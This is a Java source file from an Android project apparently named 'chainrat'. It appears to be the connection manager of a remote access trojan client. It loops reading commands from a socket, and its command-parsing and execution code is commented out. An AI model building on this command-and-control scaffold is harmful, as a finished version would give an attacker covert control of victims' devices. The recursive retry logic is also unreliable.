package com.nefi.chainrat;

import android.content.Context;
import android.os.SystemClock;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.nefi.chainrat.networking.Command;
import com.nefi.chainrat.networking.IOSocket;
import org.json.JSONObject;

import java.security.spec.ECField;

public class ConnectionManager{

    private static final String TAG = "CM";
    public static Context contextOfApplication;
    private static IOSocket socket = new IOSocket();
    private static CommandManager cm = new CommandManager();

    public static void startAsync(Context con) {
        try {
            Log.d(TAG, "in try of startAsync()");
            contextOfApplication = con;
            sendReq();
        }catch (Exception ex){
            Log.d(TAG, "in catch of startAsync()");
            startAsync(con);
        }
    }

    public static void sendReq() throws Exception{
        //Handle the packet

        //Read, func checks if socket is connected and tries to reconnect if not
        String response = socket.read();

        if(response == null){
            throw new Exception();
        }

        Log.d(TAG, "in sendReq()");

        /*
        //Convert from json
        GsonBuilder gb = new GsonBuilder();
        Gson gson = gb.create();

        try{
            Command myCommand = gson.fromJson(response, Command.class);
            //Exec command
            if(myCommand == null){
                throw new Exception();
            }
            //cm.executeCommand(myCommand);
            throw new Exception();
        }catch (Exception ex){
            throw new Exception();
        }
        */
    }
}
